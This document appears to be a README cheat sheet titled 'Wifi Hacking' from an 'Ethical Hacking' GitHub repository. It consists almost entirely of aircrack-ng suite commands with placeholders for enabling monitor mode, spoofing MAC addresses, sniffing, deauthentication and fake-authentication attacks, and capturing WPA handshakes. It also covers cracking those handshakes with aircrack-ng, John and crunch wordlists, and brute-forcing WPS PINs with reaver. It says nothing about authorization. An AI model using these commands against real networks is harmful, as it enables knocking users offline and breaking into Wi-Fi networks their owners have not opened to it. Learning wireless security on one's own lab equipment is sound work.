# Wifi Hacking

|Commands|
|--------------|
|[Network Manager Commands](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#network-manager-commands)|
|[Network Adapter Testing Commands](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#network-adapter-testing-commands)|
|[Changing MAC Address](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#changing-mac-address)|
|[Sniff Network](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#sniff-network)|
|[Capture Data](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#capture-data)|
|[Analyse Data](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#analyse-data)|
|[Associate with Router](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#associate-with-router)|
|[DE-Authentication Attack](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#de-authentication-attack)|
|[Fake-Authentication Attack](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#fake-authentication-attack)|
|[WPA Handshake Capture](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#wpa-handshake-capture)|
|[Password Cracking Using `John`](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#password-cracking-using-john)|
|[Password Cracking using `wordlist`](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#password-cracking-using-wordlist)|
|[Create word list](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#create-word-list)|
|[Password Cracking Without `Word list`](https://github.com/ohm-vishwa/Ethical-Hacking-Cheat-Sheet?tab=readme-ov-file#password-cracking-without-word-list)|
---

# Network Manager commands

> ### Kill Network Manager
```bash
airmon-ng check kill
```

> ### Enable Network Manager

```bash
service NetworkManager start
```

> ### Restart Network Manager
```bash
systemctl restart NetworkManager
```

> ### Check Status of Network Manager
```bash
systemctl status NetworkManager
```
---

# Network Adapter Testing Commands

> ### Enable Monitor Mode
```bash
airmon-ng start wlan0
```

> ### Disable Monitor Mode
```bash
airmon-ng stop wlan0
```

> ### Packet Injection test
```bash
aireplay-ng --test wlan0
```

> ### Access Point Creation test

you can put any fake MAC Address like this `00:01:02:03:04:05`
```bash
airbase-ng -a 00:01:02:03:04:05 --essid "<AP_name>" -c {channel_no.} wlan0
```

---

# Changing MAC Address
```bash
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```
# Sniff Network 

> ### Sniff Network around `2.4 GHz`
```bash
airodump-ng wlan0
```

> ### Sniff Network Both `2.4 GHz and 5 GHz`
```bash
airodump-ng --band a wlan0
```

> ### Capture data both `2.4 GHz and 5 GHz`
```bash
airodump-ng --band abg wlan0
```
---
# Capture Data
```bash
airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write (file_name_without_extension) wlan0
```
# Analyse Data
```bash
wireshark
```
---

# Associate with router
```bash
aireplay-ng --fakeauth 0 -a {router_MAC_add} -h {Your_NIC_MAC_add} waln1
```

# DE-Authentication Attack
```bash
aireplay-ng --deauth {no_of_deauth_packets} -a {router_MAC_add} -c {target_MAC_add} wlan0
```
if it`s fails then, target router on specfic channel

```bash
airodump-ng --bssid {router_MAC_add} --channel {channel_no.} wlan0
```

# Fake-Authentication Attack
```bash
aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan0
```

# WPA Handshake Capture
```bash
airodump-ng --bssid {router_MAc_add} --channel {channel_no.} --write {file_name_without_extn} wlan0
```

# Password Cracking Using `John`

> ### `.cap` to `.hccap`
```bash
aircrack-ng {.cap} -J {extension_name_not_required}
```
> ### `.hccap` to `.txt`
```bash
hccap2john {.hccap} > {.txt}
```
> ### Crack Password
```bash
john {.txt}
```

---

# Password Cracking using `wordlist`
```bash
aircrack-ng {.cap} -w {Wordlist.txt}
```
---
# create word list
```sh
man crunch
crunch 6 8 {key length} abc12 {char used} -o test.txt
```
> ## Create word list using pattern
```sh
crunch {key_length Ex: 6 8} {char_used Ex: abc12} -o {.txt} -t {patter Ex: a@@@@b}
```

---
# Password Cracking `Without Word list`

> ## Scan WPS Enable Network Around us

```sh
wash --interface wlan0
```

>[!WARNING]\
>Current version of reaver have some bugs, you can use old version

> ## Brute force the pin attack
```sh
reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan0 -vvv --no-associate 
```

# =}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)

